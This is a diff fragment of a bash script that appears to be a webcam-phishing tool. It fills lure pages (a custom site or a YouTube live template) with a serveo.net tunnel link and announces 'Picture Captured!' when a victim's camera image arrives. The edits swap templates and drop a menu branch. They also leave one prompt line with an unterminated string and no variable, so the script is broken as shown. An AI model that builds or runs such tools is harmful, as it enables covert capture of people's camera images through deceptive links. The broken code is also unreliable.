@@ -84,7 +84,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Picture Captured!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -155,8 +155,7 @@ default_option_template="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Site url: \e[0m' fest_name
-fest_name="${fest_name//[[:space:]]/}"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Site url:
 elif [[ $option_tem -eq 2 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
 elif [[ $option_tem -eq 3 ]]; then
@@ -273,13 +272,10 @@ payload() {
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+forwarding_link+'$link'+g' customsite.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
-else
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
 fi
 rm -rf index3.html
